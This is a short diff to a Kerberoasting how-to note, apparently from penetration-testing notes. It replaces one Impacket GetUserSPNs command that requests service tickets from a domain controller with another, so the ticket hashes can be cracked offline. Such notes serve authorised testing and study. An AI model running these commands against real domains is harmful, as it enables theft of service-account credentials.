@@ -9,7 +9,7 @@ TGS is encrypted with the servers account hash. Thus if it is cracked, we get th
 # How to do it
 Get the TGS of the DC:
 ```bash
-GetUserSPNs.py [DOMAIN]/[USERNAME]:[PASSWORD] -dc-ip [IP of DC] -request
+sudo impacket-GetUserSPNs -request -dc-ip $(DC_IP) $(DOMAIN)/$(USER)
 ```
 Store the hash in a text file and decrypt the hash:
 ```bash
